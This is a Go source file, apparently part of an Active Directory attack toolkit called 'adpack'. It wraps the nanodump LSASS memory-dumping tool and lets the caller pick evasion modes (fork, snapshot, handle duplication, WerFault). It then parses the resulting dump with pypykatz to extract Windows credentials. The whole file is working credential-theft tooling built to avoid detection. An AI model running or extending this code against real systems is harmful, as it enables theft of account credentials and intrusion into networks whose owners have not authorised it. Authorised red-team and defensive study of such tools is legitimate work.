package tools

import (
	"adpack/utils"
	"context"
	"fmt"
	"os"
	"path/filepath"
)

type nanodumpTool struct{}

var Nanodump = nanodumpTool{}

func (nanodumpTool) Name() string { return "nanodump" }
func (nanodumpTool) Available() bool {
	return utils.ToolAvailable("nanodump") || utils.ToolAvailable("nanodump.exe")
}

type NanodumpConfig struct {
	Binary   string
	Output   string
	Fork     bool
	Snapshot bool
	Dup      bool
	Werfault bool
}

func (n nanodumpTool) Run(ctx context.Context, req ExecutionRequest) (*ExecutionResult, error) {
	args := []string{}
	if req.Evasion == "fork" {
		args = append(args, "--fork")
	}
	if req.Evasion == "snapshot" {
		args = append(args, "--snapshot")
	}
	if req.Evasion == "dup" {
		args = append(args, "--dup")
	}
	if req.Evasion == "werfault" {
		args = append(args, "--werfault")
	}
	args = append(args, req.Args...)
	binary := "nanodump"
	if resolved := utils.ResolveLocalPath(binary); resolved != "" {
		binary = resolved
	} else if resolved := utils.ResolveLocalPath("nanodump.exe"); resolved != "" {
		binary = resolved
	}
	cr := utils.RunCommandCtx(ctx, binary, args)
	if !cr.Success {
		return cmdResultToExecResult(cr), &ToolError{
			Tool: "nanodump", Op: "Run",
			Err:      fmt.Errorf("exit code %d: %s", cr.ExitCode, cr.Stderr),
			ExitCode: cr.ExitCode,
		}
	}
	return cmdResultToExecResult(cr), nil
}

func (n nanodumpTool) ParseDump(ctx context.Context, dmpPath string) (*ExecutionResult, error) {
	absPath, err := filepath.Abs(dmpPath)
	if err != nil {
		return nil, &ToolError{
			Tool: "nanodump", Op: "ParseDump",
			Err: fmt.Errorf("resolving dump path: %w", err),
		}
	}
	if _, err := os.Stat(absPath); os.IsNotExist(err) {
		return nil, &ToolError{
			Tool: "nanodump", Op: "ParseDump",
			Err: fmt.Errorf("dump not found: %s", absPath),
		}
	}
	cr := utils.RunCommandCtx(ctx, "pypykatz", []string{"lsa", "minidump", absPath})
	if !cr.Success {
		return cmdResultToExecResult(cr), &ToolError{
			Tool: "nanodump", Op: "ParseDump",
			Err:      fmt.Errorf("pypykatz parse failed: %s", cr.Stderr),
			ExitCode: cr.ExitCode,
		}
	}
	return cmdResultToExecResult(cr), nil
}
